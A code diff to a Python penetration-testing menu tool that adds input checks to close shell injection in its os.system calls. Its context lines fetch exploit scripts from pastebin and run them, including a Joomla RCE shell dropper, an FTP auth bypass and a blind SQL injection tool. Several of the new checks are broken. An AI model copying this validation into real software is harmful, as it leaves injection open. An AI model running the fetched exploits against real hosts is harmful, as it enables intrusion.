@@ -575,7 +575,9 @@ class wpscan:
         else:
             test_target = 'http://'+target
         try:
-            urllib2.urlopen(test_target)
+            url = urlparse(test_target)
+            socket.gethostbyname(url.netloc)
+            target = url.scheme + '://' + url.netloc + url.path 
             self.menu(target)
         except KeyboardInterrupt:
             informationGatheringMenu()
@@ -644,7 +646,9 @@ class CMSmap:
         else:
             test_target = 'http://'+target
         try:
-            urllib2.urlopen(test_target)
+            url = urlparse(test_target)
+            socket.gethostbyname(url.netloc)
+            target = url.scheme + '://' + url.netloc + url.path 
             self.run(target)
             response = raw_input(continuePrompt)
         except KeyboardInterrupt:
@@ -721,7 +725,9 @@ class doork:
         else:
             test_target = 'http://'+target
         try:
-            urllib2.urlopen(test_target)
+            url = urlparse(test_target)
+            socket.gethostbyname(url.netloc)
+            target = url.scheme + '://' + url.netloc + url.path
             self.run(target)
             response = raw_input(continuePrompt)
         except KeyboardInterrupt:
@@ -736,8 +742,6 @@ class doork:
         os.system("pip install beautifulsoup4 requests Django==1.11")
 
     def run(self, target):
-        if not "http://" in target:
-            target = "http://" + target
         logPath = "logs/doork-" + \
             strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
         try:
@@ -1036,8 +1040,12 @@ class brutex:
         os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)
 
     def run(self):
-        target = raw_input("Enter Target IP: ")
-        os.system("brutex %s" % target)
+        target = raw_input("Enter Target IP: ").split(' ')[0]
+        try:
+            socket.gethostbyname(target)
+            os.system("brutex %s" % target)
+        except KeyboardInterrupt:
+            fsociety()
 
 
 class arachni:
@@ -1061,9 +1069,13 @@ class arachni:
             "gem install bundler && bundle install --without prof && rake install")
 
     def run(self):
-        target = raw_input("Enter Target Hostname: ")
-        os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
-                  (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
+        target = raw_input("Enter Target Hostname: ").split(' ')[0]
+        try:
+            socket.gethostbyname(target)
+            os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
+                (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
+        except KeyboardInterrupt:
+            fsociety()
 
 # Updated to Here
 
@@ -1081,9 +1093,18 @@ def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
+    common_commands = ['get','put','list','GET','PUT','LIST']
     os.system("python gabriel.py")
-    ftpbypass = raw_input("Enter Target IP and Use Command:")
-    os.system("python gabriel.py %s" % ftpbypass)
+    ftpbypass = raw_input("Enter Target IP and Use Command:").split(' ')
+    try:
+        socket.gethostbyname(ftpbypass[0])
+        if ftpbypass[1] in common_commands:
+            os.system("python gabriel.py %s %s" % (ftpbypass[0],ftpbypass[1]))
+        else:
+            print 'Command Error!!. Please check the Use command.'
+            fsociety()
+    except KeyboardInterrupt:
+        fsociety()
 
 
 def sitechecker():
@@ -1105,10 +1126,19 @@ def ifinurl():
 def bsqlbf():
     clearScr()
     print("This tool will only work on blind sql injection")
-    cbsq = raw_input("select target: ")
-    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
-    os.system("perl bsqlbf.pl -url %s" % cbsq)
-    os.system("rm bsqlbf.pl")
+    cbsq = raw_input("select target: ").split(' ')[0]
+    test_target = urlparse(cbsq)
+    try:
+        socket.gethostbyname(test_target.netloc)
+        if test_target.scheme != '':
+            cbsq = test_target.scheme + '://' + test_target.netloc + test_target.path
+        else:
+            cbsq = test_target.netloc + test_target.path
+        os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
+        os.system("perl bsqlbf.pl -url %s" % cbsq)
+        os.system("rm bsqlbf.pl")
+    except KeyboardInterrupt:
+        fsociety()
 
 def atscan():
     print ("Do You To Install ATSCAN ?")
@@ -1142,9 +1172,12 @@ def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget = raw_input("Select a targets list:")
-    os.system("python temp.py %s" % jmtarget)
-
+    jmtarget = raw_input("Select a targets list:").split(' ')[0]
+    try:
+        os.path.exists(jmtarget)
+        os.system("python temp.py %s" % jmtarget)
+    except KeyboardInterrupt:
+        fsociety()
 
 def inurl():
     dork = raw_input("select a Dork:")
@@ -1347,20 +1380,29 @@ def shellnoob():
 
 
 def androidhash():
-    key = raw_input("Enter the android hash: ")
-    salt = raw_input("Enter the android salt: ")
-    os.system(
-        "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
-    os.system(
-        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
+    key = raw_input("Enter the android hash: ").split(' ')[0]
+    salt = raw_input("Enter the android salt: ").split(' ')[0]
+    symbols = ['!','@','#','$','%','^','&','*','(',')','-','=','+','|','||','&&','/','//','+']
+    if symbols not in key and symbols not in salt:
+        os.system(
+            "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
+        os.system(
+            "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
+    else:
+        print 'Hash or Slat Error. Please check the hash and salt.'
+        fsociety()
 
 
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
-    target = raw_input("Select a target: ")
-    os.system(
-        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
-    os.system("python cms.py %s" % target)
+    target = raw_input("Select a target: ").split(' ')[0]
+    try:
+        socket.gethostbyname(target)
+        os.system(
+            "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
+        os.system("python cms.py %s" % target)
+    except KeyboardInterrupt:
+        fsociety()
 
 
 def smtpsend():
